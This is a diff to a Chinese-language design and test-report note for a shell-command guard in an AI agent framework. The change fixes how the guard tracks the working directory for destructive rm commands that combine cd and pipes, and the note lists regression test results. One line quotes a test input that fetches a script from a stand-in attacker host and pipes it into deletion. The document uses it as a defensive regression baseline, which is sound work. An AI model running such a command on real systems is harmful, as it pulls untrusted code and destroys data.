@@ -62,9 +62,11 @@ modules: [src/frameworks/agent/command-model.ts, src/frameworks/agent/write-targ
 1. `Payload` 增加**可选** `segmentIndex`，保持现有 payload 结构和消费方兼容。`buildSegments` 返回内部的 token→段索引映射，`collectPayloads` 给词/heredoc 载荷记录来源；解释器载荷由已有的段循环直接记录索引。括号展开的既有递归载荷不把内层索引冒充外层索引。
 2. `collectShellPayloadTargets` 预计算一次 `resolveCwdAt`；有所属段时传该段 cwd，未知来源维持原 fallback，不用新元数据豁免。`absenceAllowed` 仍严格等于既有 `payloadsCwdAnchored(...)` 结果，避免外置脚本缺席证明被顺带放宽。
 3. `evaluateFromModel` 改为消费 `resolveCwdAt` 的数组，删除重复的 `trackCwd` 终态跟踪；段求值和已有 cd 跳过条件不变。
-4. `checkDataDirDestructive` 复用已有 `splitShellSegments` 保留引号/管道边界；raw 段与结构段数量一致时按相同索引取 `resolveCwdAt`，数量不一致时保留旧跟踪作为 fail-closed 兜底，不猜映射。`segmentDestructive` 与 `isKillAtCommandPosition` 不改。
+4. `checkDataDirDestructive` 只在结构模型证明 `cd` 与 `|` 同时存在时，用已有 `splitShellSegments` 重切该命令并按相同索引取 `resolveCwdAt`；无 cd 的命令完整保留旧 raw 分段与目标提取。raw 段与结构段数量不一致时保留旧跟踪兜底，不猜映射。`segmentDestructive` 与 `isKillAtCommandPosition` 不改。
 
-**取舍**：没有采用「看到反引号就一律 BLOCK」或「管道有 cd 就一律 BLOCK」。前者会误伤树外绝对路径，后者会误伤合法 worktree 操作且不符合管道继承 cwd 的事实。也没有重写旧破坏面的目标提取；本次只替换 cwd 来源，控制爆炸半径。
+**取舍**：没有采用「看到反引号就一律 BLOCK」或「管道有 cd 就一律 BLOCK」。前者会误伤树外绝对路径，后者会误伤合法 worktree 操作且不符合管道继承 cwd 的事实。也没有重写旧破坏面的目标提取；本次只替换 cd+pipe 面的 cwd 来源，控制爆炸半径。
+
+实现中曾把全部命令都改用 `splitShellSegments`，agent 全目录回归随即发现 `curl https://evil.example/x.sh | xargs -i rm foo` 从既有 ALLOW 翻成 BLOCK（`tests/frameworks/agent/bash-guard-value-wrapper-flags.test.ts:98,171` 的基线锚）。没有修改该测试，也没有给 xargs 加特例；最终把重切范围收窄为真实的 cd+pipe 命令，无 cd 的间接形态保持原路径。
 
 ## 机制识别与修改类别
 
@@ -82,7 +84,14 @@ modules: [src/frameworks/agent/command-model.ts, src/frameworks/agent/write-targ
 
 - 修前大獭探针：6 条静态用例为 3 failed / 3 passed（反引号漏拦、`cd /tmp | rm` 的工作区 cwd 预期差异、管道 `/tmp` 误拦）；第二项按上一节的口径校准，不作为新增禁删规则依据。完整输入见大獭工作区 `review-1645/repro.test.ts`。
 - 修前本分支契约：`npx vitest run tests/frameworks/agent/bash-guard-rm-cwd.test.ts --reporter=verbose` → **13 条中 3 failed / 10 passed**。三条失败分别是反引号 guard ALLOW、`$()` evaluator 错落工作区、管道 `/tmp` rm 被 mainTree 误拦。辅助断言核对后，未改上述三条期望来迁就实现。
-- 修后定向、guard 相关回归、build / lint / typecheck / 全量测试：待实现后补真实命令与统计。
+- 修后定向：`npx vitest run tests/frameworks/agent/bash-guard-rm-cwd.test.ts --reporter=verbose` → **1 文件 13 passed**；修前失败测试未改期望。
+- 定向 + 真实回放 + wrapper 矩阵：`bash-guard-rm-cwd`、`guard-v2-real-replay`、`bash-guard-value-wrapper-flags` → **3 文件 73 passed / 6 skipped**。
+- 写求值与模型定向：command-model / command-lexer / write-target-evaluator / guard-model-judge → **3 文件 256 passed**；destructive/session-cwd/gpg1 等相关面 → **5 文件 123 passed / 6 skipped**。
+- 全 agent 目录：`VITEST_POOL_SIZE=2 npx vitest run tests/frameworks/agent --reporter=dot` → **86 文件 2257 passed / 6 skipped**。
+- 全量：`VITEST_POOL_SIZE=2 npm test` → **438 文件 6976 passed / 6 skipped**（rebase 到最新基线 `c65fc515` 后的最终计数），含 pretest 的全量 ESLint。
+- 构建与静态门：`npm run build` 通过；`npm run lint` 通过；`npx tsc --noEmit` 通过。仓内没有 `typecheck` script，`npm run typecheck` 实测返回 Missing script，未伪报为该 script 通过。
+- 两次提交钩子（修前测试 + 方案、最终实现）：build、lint、lint:schema、双形态 smoke:boot、test:script-arg-parse、lint:docs / lint:capability / lint:tests / lint:skills 等通过；文档与 skill 均只出现存量预算内 warning。rebase 后最终提交链与 SHA 见 PR。
+- 探针始终为静态判定，未实际执行删除；工作树测试 diff 与 `git diff --check` 均干净。
 
 ## 交付边界
 
